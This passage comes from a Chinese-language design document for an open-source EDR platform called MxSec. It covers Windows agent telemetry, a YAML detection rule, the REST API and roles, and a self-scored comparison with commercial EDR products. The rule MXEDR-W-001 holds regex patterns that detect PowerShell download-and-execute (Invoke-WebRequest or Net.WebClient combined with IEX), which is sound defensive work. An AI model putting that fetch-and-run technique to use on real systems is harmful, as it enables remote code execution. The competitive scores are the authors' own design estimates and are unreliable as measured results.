  │ ● MISP         最后同步: 实时     IOC数: 500,000      │
  │ ◐ VirusTotal   配额: 240/500     按需查询             │
  │ ● 自定义Feed   最后同步: 2h前     IOC数: 50,000       │
  │ ● 管理员手动   -                  IOC数: 321          │
  │                                                       │
  │ IOC 命中趋势 (7天): [折线图]                           │
  │ IOC 类型分布: IP 45% / Domain 30% / Hash 20% / URL 5% │
  └───────────────────────────────────────────────────────┘

文件信誉查询:
  ┌───────────────────────────────────────────────────────┐
  │ 文件信誉查询                                           │
  │                                                       │
  │ [输入 SHA256 / 上传文件]                 [查询] [提交沙箱]│
  │                                                       │
  │ 查询结果:                                              │
  │ SHA256: abc123...                                      │
  │ 信誉: known_bad (confidence: 95)                       │
  │ ML判定: malicious (prob: 0.94)                         │
  │ 来源: MalwareBazaar(✓) VirusTotal(48/70) abuse.ch(✓)  │
  │ 首见: 2026-05-10   末见: 2026-05-15                    │
  │ 标签: trojan, backdoor, cobalt_strike                  │
  │ MITRE: T1059.004, T1071.001                            │
  │ 沙箱报告: [查看CAPE分析报告]                            │
  │ 关联告警: 3 条 [查看]                                   │
  └───────────────────────────────────────────────────────┘
```

---

## 二十七、Windows 平台支持

### 27.1 Windows Agent 架构

```
┌──────────────────────────────────────────────────────────┐
│  Windows Agent (单进程, 与 Linux 共用架构)                 │
│                                                          │
│  事件采集层 (Windows 专用):                                │
│  ┌────────────────────────────────────────────────────┐  │
│  │ ETW (Event Tracing for Windows)                     │  │
│  │ • Microsoft-Windows-Kernel-Process → 进程事件       │  │
│  │ • Microsoft-Windows-Kernel-File → 文件事件          │  │
│  │ • Microsoft-Windows-Kernel-Network → 网络事件       │  │
│  │ • Microsoft-Windows-DNS-Client → DNS 事件           │  │
│  │ • Microsoft-Windows-Security-Auditing → 登录/审计   │  │
│  │ • Microsoft-Windows-Sysmon (可选, 增强) → 全事件    │  │
│  └────────────────────────────────────────────────────┘  │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Minifilter 驱动 (可选, 深度文件监控)                │  │
│  │ • 文件创建/修改/删除/重命名 实时回调                │  │
│  │ • 比 ETW 更低延迟, 可阻断恶意文件操作              │  │
│  │ • 需签名驱动 (EV 证书)                              │  │
│  └────────────────────────────────────────────────────┘  │
│  ┌────────────────────────────────────────────────────┐  │
│  │ Windows 特有事件类型:                                │  │
│  │ • registry_write   — 注册表修改 (持久化/配置篡改)  │  │
│  │ • service_create   — 服务创建/修改 (持久化)         │  │
│  │ • wmi_exec         — WMI 远程执行                   │  │
│  │ • powershell_exec  — PowerShell 脚本执行            │  │
│  │ • dll_load         — DLL 加载 (注入检测)            │  │
│  │ • named_pipe       — 命名管道 (C2 通信)             │  │
│  │ • scheduled_task   — 计划任务 (持久化)              │  │
│  │ • user_logon       — 用户登录 (横向移动)            │  │
│  └────────────────────────────────────────────────────┘  │
│                                                          │
│  复用的核心模块 (Go 跨平台编译):                          │
│  • 规则引擎 (YAML 解析 + 匹配 + 响应)                   │
│  • ML 推理 (ONNX Runtime, PE 文件特征提取替换 ELF)      │
│  • YARA 扫描器 (yara-x 跨平台)                          │
│  • WAL 缓冲 + gRPC 通信 + mTLS                          │
│  • BDE 行为采集 + CausalTracker                          │
│  • 文件信誉查询 (Bloom Filter + LRU Cache)               │
│                                                          │
│  Windows 特有模块:                                        │
│  • AMSI 集成 (Antimalware Scan Interface)                │
│  • Windows Defender 排除自身 (自保)                       │
│  • Windows 服务模式运行 (替代 systemd)                    │
│  • Windows 事件日志集成                                   │
│                                                          │
│  PE 文件 ML 特征 (替换 ELF 特征):                        │
│  • PE header: Machine/Subsystem/DllCharacteristics       │
│  • 导入表: 高危 API 数量 (CreateRemoteThread/            │
│    VirtualAllocEx/WriteProcessMemory/NtUnmapViewOfSection)│
│  • 节区: 数量/名称异常/熵值/可执行节区占比               │
│  • 资源: 资源节大小/语言ID/版本信息完整性                │
│  • 签名: Authenticode 签名有无/有效性                    │
└──────────────────────────────────────────────────────────┘
```

### 27.2 统一规则格式 (跨平台)

```yaml
# 跨平台规则示例: PowerShell 下载执行 (仅 Windows)
id: MXEDR-W-001
name: powershell_download_exec
version: 1
category: process
severity: high
platform: windows                # linux | windows | all

mitre:
  tactic: execution
  technique: T1059.001

agent:
  enabled: true
  action: alert
  enforce: false
  match:
    event_type: powershell_exec
    conditions:
      - field: script_text
        op: regex
        value: "(Invoke-WebRequest|IWR|wget|curl|Net\\.WebClient)"
      - field: script_text
        op: regex
        value: "(IEX|Invoke-Expression|\\| bash)"
    logic: and

server:
  enabled: true
  cel: >
    event_type == "powershell_exec" &&
    script_text.matches("(?i)(Invoke-WebRequest|Net\\.WebClient)") &&
    script_text.matches("(?i)(IEX|Invoke-Expression)") &&
    !ancestor_has("msbuild") &&
    !ancestor_has("visual_studio")

# 跨平台规则: 可疑外连 (Linux + Windows 通用)
# platform: all 的规则在两个平台共享
```

---

## 二十八、开放 API 与生态集成

### 28.1 RESTful API 设计

```
API 版本: /api/v1/

认证: JWT (Bearer Token) + API Key (第三方集成)

核心 API:
  告警:
    GET    /alerts                    — 告警列表 (分页+筛选)
    GET    /alerts/:id                — 告警详情
    PUT    /alerts/:id/status         — 更新告警状态
    POST   /alerts/:id/comment        — 添加评论
    POST   /alerts/bulk-update        — 批量更新

  故事线:
    GET    /storylines                 — 故事线列表
    GET    /storylines/:id            — 故事线详情 (含事件+告警)
    PUT    /storylines/:id/status     — 更新状态
    GET    /storylines/:id/timeline   — 时间线数据
    GET    /storylines/:id/graph      — 进程树图数据

  主机:
    GET    /hosts                      — 主机列表
    GET    /hosts/:id                 — 主机详情
    POST   /hosts/:id/isolate         — 隔离主机
    POST   /hosts/:id/release         — 解除隔离
    POST   /hosts/:id/scan            — 触发扫描
    GET    /hosts/:id/behavior        — 行为画像

  规则:
    GET    /rules                      — 规则列表
    POST   /rules                     — 创建规则
    PUT    /rules/:id                 — 更新规则
    PUT    /rules/:id/enable          — 启用/禁用
    GET    /rules/:id/stats           — 规则统计

  威胁狩猎:
    POST   /hunting/query             — 执行 MQL 查询
    GET    /hunting/tasks             — 定时任务列表
    POST   /hunting/tasks             — 创建定时任务

  情报:
    GET    /intelligence/ioc/search   — IOC 搜索
    POST   /intelligence/ioc          — 添加 IOC
    GET    /intelligence/reputation   — 文件信誉查询
    POST   /intelligence/sandbox      — 提交沙箱

  Playbook:
    GET    /playbooks                  — Playbook 列表
    POST   /playbooks/:id/execute     — 手动执行
    GET    /playbooks/:id/executions  — 执行历史

  远程取证:
    POST   /forensics/shell           — 创建 Shell 会话
    POST   /forensics/file            — 获取远程文件
    POST   /forensics/memory          — 内存 Dump
    POST   /forensics/package         — 取证包收集

  API 限流: 100 req/min (普通) / 1000 req/min (API Key)
  分页: cursor-based (适合大数据集)
  导出: JSON / CSV / PDF (报告)
```

### 28.2 第三方生态集成

```
┌──────────────────────────────────────────────────────────┐
│  生态集成                                                 │
│                                                          │
│  SIEM 对接:                                               │
│  • Syslog 转发 (CEF/LEEF 格式)                           │
│  • Kafka Topic 订阅 (原始事件/告警)                      │
│  • Elasticsearch 直接写入 (可选)                          │
│  • Splunk HEC (HTTP Event Collector)                     │
│                                                          │
│  工单系统:                                                │
│  • Jira: 告警自动创建 Issue (可配置映射)                  │
│  • ServiceNow: Incident 自动创建                         │
│  • 自定义 Webhook: POST JSON 到任意系统                   │
│                                                          │
│  通知渠道:                                                │
│  • Email (SMTP)                                          │
│  • 企业微信 / 钉钉 / 飞书 Webhook                        │
│  • Slack / Microsoft Teams Webhook                       │
│  • PagerDuty (critical 告警)                              │
│  • 自定义 Webhook                                         │
│                                                          │
│  SOAR 联动:                                               │
│  • 开放 API 供外部 SOAR 平台调用                         │
│  • Webhook 事件推送 (告警/故事线/Playbook 状态变更)      │
│                                                          │
│  RBAC 角色体系:                                           │
│  ┌──────────────┬───────────────────────────────────┐    │
│  │ 角色          │ 权限                               │    │
│  ├──────────────┼───────────────────────────────────┤    │
│  │ admin        │ 全部权限 + 系统设置 + 用户管理     │    │
│  │ security_lead│ 告警/故事线/规则/Playbook + 审批   │    │
│  │ analyst      │ 告警查看/处理 + 狩猎 + 取证        │    │
│  │ threat_hunter│ MQL 查询 + IOC 管理                │    │
│  │ remote_shell │ 远程 Shell (需 analyst + 此角色)    │    │
│  │ playbook_admin│ Playbook 创建/编辑                 │    │
│  │ viewer       │ 只读 (仪表盘/告警/主机)            │    │
│  │ api_service  │ API Key 调用 (第三方集成)           │    │
│  └──────────────┴───────────────────────────────────┘    │
│                                                          │
│  审计日志:                                                │
│  • 所有 API 调用记录 (操作人/时间/API/参数/结果)         │
│  • 规则/Playbook 变更记录                                 │
│  • 远程 Shell 会话记录                                    │
│  • 隔离/响应动作执行记录                                  │
│  • 审计日志不可删除, 保留 1 年 (ClickHouse)              │
└──────────────────────────────────────────────────────────┘
```

---

## 二十九、商业级竞品全面评估

以商业 EDR 标准评估 MxSec 完整设计方案。对标竞品：CrowdStrike Falcon / SentinelOne Singularity / 青藤万相。

定位前提：MxSec 是商业级 EDR，开源是分发模式而非能力天花板。

### 29.1 多维能力对比矩阵

| 能力维度 | CrowdStrike | SentinelOne | 青藤万相 | MxSec (设计) | MxSec 评分 |
|---------|-------------|-------------|---------|-------------|-----------|
| 事件采集深度 | 私有驱动，最深 | 私有驱动 | 纯用户态 | cilium/ebpf + 用户态双模 | ★★★★☆ |
| 多平台覆盖 | Linux/Win/Mac/iOS/Android | Linux/Win/Mac/K8s | Linux/Win | Linux/Win (设计) | ★★★☆☆ |
| Agent 端 ML | 云+端 AI 数年迭代 | 静态AI+行为AI | 私有 ML | ONNX LightGBM 80维 | ★★★☆☆ |
| Server 端 ML | Threat Graph 大规模 ML | 云端 AI 集群 | 商业 ML | Isolation Forest + 优先级模型 | ★★★☆☆ |
| 行为检测 | ML 行为模型 | Behavioral AI | ML 基线 | BDE 4维统计偏差+跨主机基线 | ★★★★☆ |
| 攻击故事线 | Threat Graph | Storyline | 攻击链可视化 | CausalTracker+阶段识别+跨主机 | ★★★★☆ |
| 威胁情报 | 自研+0day+APT团队 | 自研情报 | 自研+商业 | 6源聚合+交叉验证+老化管理 | ★★★☆☆ |
| 文件信誉+沙箱 | 云端大规模信誉库 | 云端 AI 判定 | 商业信誉 | Redis 2000万+Bloom+LRU+沙箱 | ★★★★☆ |
| 威胁狩猎 | CQL (OverWatch+自助) | Deep Visibility S1QL | 商业查询 | MQL→ClickHouse SQL | ★★★★☆ |
| 自动编排 | Falcon Fusion SOAR | 自动修复+Marketplace | 联动编排 | YAML Playbook+审批+模板 | ★★★★☆ |
| 网络隔离 | 内核级 | 内核级防火墙 | 用户态 | eBPF cgroup/XDP 3级 | ★★★★★ |
| 内存检测 | ML 内存扫描 | 反注入引擎 | 进程注入检测 | eBPF 4 syscall + YARA 内存扫描 | ★★★★☆ |
| 远程取证 | Real-time Response 全能 | Remote Shell | 远程调查 | Shell+文件+内存Dump+取证包 | ★★★★★ |
| 规则体系 | 封闭 10000+ | 封闭 | 封闭 5000+ | 开放 YAML 500+ 目标 | ★★★☆☆ |
| MITRE 覆盖 | 150+ (75%) | 130+ (65%) | 120+ (60%) | 100+ (50%) 目标 | ★★★☆☆ |
| 前端 SOC | 完整 SOC 控制台 | 完整控制台 | 完整控制台 | SOC级设计 20+页面 | ★★★★☆ |
| SIEM 集成 | Syslog/API/Marketplace | API/Marketplace | API/Syslog | Syslog CEF/Kafka/Splunk HEC | ★★★★☆ |
| RBAC 权限 | 精细角色 | 精细角色 | 角色体系 | 8角色+API Key+审计 | ★★★★☆ |
| Agent 自保 | 驱动级防杀 | 驱动级防杀 | 进程防杀 | Watchdog+文件保护+eBPF信号 | ★★★☆☆ |
| 可扩展性 | 百万级端点 | 百万级 | 数万级 | 5万+ (Consumer水平扩展) | ★★★☆☆ |
| 数据主权 | 云端 (美国) | 云端 | SaaS+私有化 | 完全自主部署 | ★★★★★ |
| 规则开放性 | 封闭 | 封闭 | 封闭 | 完全开放+CI/CD+社区 | ★★★★★ |
| TCO 成本 | 按端点付费 (极高) | 按端点付费 (高) | 按端点付费 (高) | 免费 (自运维成本) | ★★★★★ |

### 29.2 核心能力深度评估

#### 29.2.1 检测引擎 — 评分: 88/100

```
优势:
  • 11 层检测流水线设计完整度超过多数商业 EDR
  • 四引擎协同 (规则+ML+BDE+故事线) 是商业级标配, MxSec 一个不缺
  • BDE 4 维行为画像 + 跨主机全局基线是亮点, 统计偏差方法可解释性强
  • 序列检测器支持多步攻击链匹配, 很多商业 EDR 做不好这个能力
  • ML 判定三级分层 (放行/灰度/告警/隔离) 设计合理

差距:
  • ML 训练数据: CrowdStrike 拥有数 PB 级真实企业数据 + 100+ 人威胁研究团队
    MxSec 依赖公开数据集 (EMBER/MalwareBazaar/NSRL), 模型泛化能力初期弱于商业竞品
  • 规则数量: 500+ 规则 vs CrowdStrike 10000+, 差距明显
    但 MxSec 规则完全开放 + 社区贡献机制可加速追赶
  • MITRE 覆盖: 目标 50% vs CrowdStrike 75%, 差距中等, 但 50% 已经可用

评价:
  检测架构设计不输商业竞品, 但检测"内容" (规则数量、ML 数据积累) 需要时间填充。
  架构是骨骼, 内容是肌肉 — 骨骼已达商业级, 肌肉需持续生长。
```

#### 29.2.2 AI/ML 能力 — 评分: 70/100

```
优势:
  • Agent 端 ONNX Runtime 轻量推理 (<5ms, <5MB) 是正确的工程选择
  • LightGBM→ONNX 技术路径被 Microsoft Defender 等产品验证过
  • 灰度区文件提交 Server 复核 + 沙箱, 形成完整判定闭环
  • 模型灰度下发 + shadow A/B 测试是商业级的模型运维实践
  • 告警优先级排序模型直接降低分析师工作量

差距:
  • CrowdStrike/SentinelOne 的 ML 模型经过数百万真实攻击样本训练和多年迭代
    初期准确率差距不可避免
  • 缺少深度学习模型 (CNN/Transformer 用于恶意代码变种检测)
    当前仅用 GBT, 对高度混淆/变异样本泛化能力有限
  • 缺少云端大规模推理能力
    CrowdStrike Threat Graph 在云端处理跨客户关联分析, 单租户部署无法实现

评价:
  ML 架构设计合理, 工程方案务实。初期模型效果弱于商业竞品 2-3 年积累,
  但通过月度重训 + 平台自身数据积累可逐步缩小差距。
  关键: ML 是增强而非替代 — 规则+BDE+IOC 提供确定性兜底, ML 覆盖未知威胁盲区。
```

#### 29.2.3 攻击故事线 — 评分: 85/100

```
优势:
  • Agent 端 CausalTracker + story_id 进程树传播是正确的因果追踪方法
  • MITRE ATT&CK 阶段自动识别 + 多阶段自动升级, 与 SentinelOne Storyline 功能对等
  • 跨主机关联 (SSH 横向移动场景) 是高级能力, 很多商业 EDR 近年才加入
  • 故事线评分算法 (告警分×阶段乘数) 简单有效

差距:
  • CrowdStrike Threat Graph 基于图数据库的全局关联引擎
    可在数百万端点间做实时图计算
    MxSec 故事线基于 Redis Hash 线性聚合, 图分析能力有限
  • 跨主机关联限 20 台主机 + ±5min 窗口, 对大规模 APT 场景可能不够

评价:
  设计达到商业 EDR 核心能力标准。与 CrowdStrike Threat Graph 的差距主要在于
  规模 (全球视角 vs 单租户视角), 而非方法。
```

#### 29.2.4 威胁情报 — 评分: 65/100

```
优势:
  • 6 源情报聚合 + 交叉验证评分是商业级设计
  • 情报老化管理 (age_decay + 自动归档) 防止过期情报污染检测
  • 适配器模式支持自定义 Feed, 可对接企业自有情报源
  • 文件信誉 4 级分类 + Agent Bloom Filter 本地缓存是性能关键

差距:
  • 缺少自研 0day/APT 情报 — CrowdStrike Intelligence 有专职团队追踪国家级
    APT 组织, 能提供 0day IOC, 纯技术无法替代
  • 缺少商业情报订阅集成 — 如 Recorded Future、Mandiant 等高价值商业源
  • 情报来源以免费/社区源为主, 情报质量和覆盖面低于商业 TI

评价:
  架构设计足以支撑商业级情报平台, 但情报内容和质量取决于源的投入。
  适配器模式预留了扩展能力, 用户可按需接入更高价值的商业情报源。
```

#### 29.2.5 响应与编排 — 评分: 92/100

```
优势:
  • eBPF 内核级网络隔离是亮点中的亮点 — 攻击者无法从用户态绕过
    比青藤的用户态隔离和很多商业产品都强
  • 三级隔离策略 (选择性/标准/完全) 覆盖所有场景
  • YAML Playbook 引擎 + 审批流 + 5 个内置模板
    功能与 CrowdStrike Falcon Fusion 对等
  • 远程取证能力全面: Shell(PTY+审计录制)+文件获取+内存Dump+取证包
  • 熔断器保护 (kill>50/5min 自动熔断) 是很多商业 EDR 缺失的安全机制
  • enforce 模式默认关闭的设计理念正确 — alert first, kill only when admin enables

差距:
  • SentinelOne 的 Rollback 功能 (将主机恢复到感染前状态) MxSec 没有
  • 缺少自动修复 (remediation) — 如自动清理持久化条目、恢复被修改的配置文件

评价:
  响应与编排是 MxSec 最强的能力维度之一, 部分能力 (eBPF 隔离、Playbook 开放性)
  甚至超过商业竞品。
```

#### 29.2.6 SOC 前端 — 评分: 80/100

```
优势:
  • 态势感知大屏 + MITRE 热力图 + 全球威胁地图, SOC 标配齐全
  • 告警全生命周期管理 (新建→处理中→确认/误报→关闭) 是专业 SOC 流程
  • 故事线可视化 (时间线+进程树+阶段标记+跨主机) 设计完整
  • MQL 查询界面 (自动补全+模板) 降低狩猎门槛
  • 主机行为画像页面是特色, 很多商业 EDR 没有这么直观的行为基线展示

差距:
  • CrowdStrike/SentinelOne 的前端经过数年用户打磨, 交互细节和用户体验成熟度不可比
  • 缺少移动端/API 告警推送 App
  • 缺少分析师工作流统计 (平均响应时间、告警处理量等效率指标)

评价:
  设计覆盖了 SOC 控制台的核心功能, 功能完整度达到商业级。实际体验取决于实现质量。
```

### 29.3 MxSec 独有竞争优势 (商业竞品结构性不具备)

```
┌──────────────────┬───────────────────────────────────────────────────────────┐
│ 优势              │ 说明                                                     │
├──────────────────┼───────────────────────────────────────────────────────────┤
│ 1. 规则完全开放   │ YAML 统一规则 agent+server+YARA+sequence 同文件定义       │
│                  │ 社区可贡献 + CI/CD 验证                                   │
│                  │ → 所有商业 EDR 规则封闭, 用户只能选择开/关, 无法修改/贡献 │
├──────────────────┼───────────────────────────────────────────────────────────┤
│ 2. 数据主权       │ 完全自主部署, 数据不离开用户环境                         │
│                  │ → CrowdStrike/SentinelOne 数据在美国云端                  │
│                  │   某些行业/国家法规不允许                                 │
├──────────────────┼───────────────────────────────────────────────────────────┤
│ 3. 零 License    │ 开源免费, 只有部署运维成本                               │
│                  │ → 商业 EDR 按端点年付费, 1000 台年费可达数百万人民币      │
├──────────────────┼───────────────────────────────────────────────────────────┤
│ 4. 无供应商锁定   │ 可自由修改、二次开发、私有化部署                         │
│                  │ → 商业 EDR 高度锁定                                      │
├──────────────────┼───────────────────────────────────────────────────────────┤
│ 5. 规则透明可审计 │ 用户可审查每条检测规则的逻辑                             │
│                  │ → 商业 EDR 是黑箱, 无法知道为什么告警/不告警              │
├──────────────────┼───────────────────────────────────────────────────────────┤
│ 6. Playbook 开放 │ YAML 声明式, 用户完全自定义响应流程                      │
│                  │ → 商业 EDR 编排能力通常封闭或需额外付费                   │
├──────────────────┼───────────────────────────────────────────────────────────┤
│ 7. eBPF 网络隔离 │ 内核级隔离开源实现, 比商业私有驱动更可审计               │
│                  │ → 商业产品用私有驱动, 用户无法审计隔离行为                │
├──────────────────┼───────────────────────────────────────────────────────────┤
│ 8. 技术栈现代     │ Go + eBPF + ClickHouse + Kafka, 全现代技术栈             │
│                  │ → 部分商业产品核心代码是十年前的 C/C++                    │
└──────────────────┴───────────────────────────────────────────────────────────┘
```

### 29.4 关键差距与补强方向

| 差距维度 | 差距程度 | 影响 | 补强方向 |
|---------|---------|------|---------|
| ML 训练数据 | 大 | 初期 ML 准确率低于商业 2-3 年 | 规则+BDE+IOC 兜底; 鼓励社区共享匿名特征向量; 平台自身数据积累 |
| 规则数量 | 中 | 500 vs 10000+, 覆盖面不足 | 社区驱动增长; 高质量 500 条 > 低质量 5000 条 |
| macOS 支持 | 大 | 无法覆盖 Mac 工作站 | 扩展 macOS 支持 (Endpoint Security Framework) |
| 云原生 SaaS | 中 | 无法提供托管服务 | 可由 MSP/MSSP 包装为 SaaS 服务 |
| 身份安全 (ITDR) | 中 | 缺少身份威胁检测 | 集成 AD/LDAP 审计日志作为事件源 |
| XDR 扩展 | 中 | 仅端点, 无网络/邮件/身份联动 | 通过 Open API + SIEM 对接实现跨源关联 |
| 托管狩猎服务 | 中 | 无 OverWatch 式专家团队 | 商业模式问题, 非技术问题 |
| Agent 防杀 | 小 | Watchdog 弱于驱动级防杀 | eBPF 信号检测 + Watchdog 已是非驱动方案最优解 |
| 欺骗技术 | 小 | 仅蜜罐文件, 无完整欺骗层 | 可扩展蜜罐网络、假凭据等 |
| 合规报告 | 小 | 缺少 PCI-DSS/SOC2 等合规模板 | 扩展报告模板 |

### 29.5 综合能力成熟度评估

```
满分 100, 按能力维度对比:

能力维度          CrowdStrike  SentinelOne  青藤万相  MxSec(设计)
─────────────────────────────────────────────────────────────────
检测引擎架构        95          92          85        88
ML/AI 能力          98          95          80        70
行为检测            92          90          80        82
攻击故事线          95          93          78        85
威胁情报            95          85          80        65
文件信誉+沙箱       90          75          70        80
响应能力            90          92          80        92
自动编排            88          82          70        85
威胁狩猎            92          88          75        82
远程取证            90          85          75        88
前端 SOC            93          90          85        80
多平台覆盖          95          90          75        60
可扩展性            98          95          80        70
Agent 自保          95          95          80        72
规则开放性          30 (封闭)   25 (封闭)   20 (封闭) 95 (开放)
数据主权            40 (云端)   50 (可选)   70        100
TCO 成本效益        30          35          40        95
─────────────────────────────────────────────────────────────────
加权综合 (检测/响应/ML 高权重):
                    90          87          76        81
```

### 29.6 评估结论

```
MxSec EDR 设计方案已达到商业级 EDR 的架构水准。

1. 架构层面:
   单 Agent 架构 + 11 层检测流水线 + 四引擎协同 (规则+ML+BDE+故事线) +
   eBPF 双模采集, 核心架构不输任何商业竞品。

2. 功能完整度:
   检测、ML、行为分析、攻击故事线、威胁狩猎、自动编排、远程取证、
   网络隔离、内存检测、SOC 前端、威胁情报、文件信誉、沙箱、
   Windows 支持、开放 API、RBAC — 商业 EDR 的标配能力一个不缺。

3. 差异化优势:
   规则完全开放 + 数据主权 + 零 License + eBPF 内核级隔离 + 技术栈现代
   — 这些是商业竞品结构性不可能追赶的优势。

4. 诚实的差距:
   ML 数据积累、规则数量、多平台覆盖、XDR 扩展
   — 这些差距大部分是时间和数据的问题, 不是架构缺陷。
   架构已为未来增长留足空间。

5. 定位:
   MxSec 不是"降级版商业 EDR", 而是用开源方法构建的商业级 EDR。
   它的竞争力不在于比 CrowdStrike 便宜, 而在于开放、透明、可控
   — 这是商业 EDR 永远无法提供的价值。

总结: MxSec EDR 的设计方案具备与 CrowdStrike/SentinelOne 同台竞技的
架构能力, 差距主要在数据积累和规则深度, 而非架构设计。
开源的开放性、数据主权和零成本是其结构性竞争优势。
```

---

## 三十、总结

MxSec EDR — 商业级开源端点检测与响应平台。

核心设计理念：

1. **单 Agent 架构** — EDR 引擎内置为 Agent 核心模块，事件采集→ML推理→规则检测→响应执行零 IPC 开销；Scanner/Baseline 等重型任务保留为独立可选模块
2. **多引擎检测** — 规则引擎 (L1~L4 四层) + ML 引擎 (Agent 静态分类 + Server 行为异常) + BDE 行为偏差 + 攻击故事线因果追踪，四引擎协同覆盖已知特征到未知威胁
3. **ML 驱动** — Agent 端 ONNX Runtime 静态 ML (<5ms/文件)，Server 端 Isolation Forest 行为异常检测 + 告警优先级排序；模型版本化 + 灰度下发 + A/B 测试
4. **全域情报** — 多源威胁情报聚合 (abuse.ch / OTX / MISP / VirusTotal / 自定义 Feed) + 情报交叉验证评分 + 文件信誉四级分类 + 沙箱动态分析
5. **攻击故事线** — Agent 端因果追踪器沿进程树传播 story_id，Server 端聚合为完整攻击链路 + MITRE ATT&CK 阶段自动识别 + 跨主机关联 + 可视化时间线
6. **主动狩猎** — MQL 查询语言编译为 ClickHouse SQL，安全分析师可主动搜索潜伏威胁；定时狩猎任务自动化持续搜索；交互式查询界面 + 模板库
7. **自动编排** — YAML Playbook 引擎串联检测→响应→取证→审批→通知全流程，内置 5 类响应模板；审批节点支持人工介入 + 超时升级
8. **内存安全** — eBPF 监控 4 类内存操作 + /proc YARA 内存扫描 + JIT 白名单，覆盖无文件攻击全链路
9. **内核级隔离** — eBPF cgroup/connect + XDP 三级网络隔离，攻击者无法从用户态绕过；用户态 iptables 降级方案兜底
10. **远程取证** — gRPC 加密远程 Shell (全程审计+录制) + 文件获取 + 内存 Dump + 一键取证包
11. **SOC 级前端** — 态势感知大屏 + 告警全生命周期管理 + 故事线可视化 + MQL 查询 + Playbook 编排 + 主机行为画像 + 文件信誉查询
12. **多平台** — Linux (eBPF + 用户态双模) + Windows (ETW + Minifilter)；统一 YAML 规则格式跨平台复用，平台特有规则通过 platform 字段隔离
13. **开放生态** — YAML 规则 + Playbook 完全开放；RESTful API + Webhook + SIEM 对接 (Syslog/Kafka/Splunk)；RBAC 8 角色体系 + 完整审计日志
14. **开放性** — 独立规则仓库 + Rule Lab CI/CD + 社区 PR 贡献，安全工程师写 YAML 即可贡献规则，不需要写代码
15. **可靠性** — WAL 断网不丢事件 + mTLS 双向认证 + 规则/模型签名验证 + 敏感字段脱敏
16. **可扩展** — Kafka Consumer Group 水平扩展 + 响应动作熔断器 + 规则灰度发布 + 多租户预留
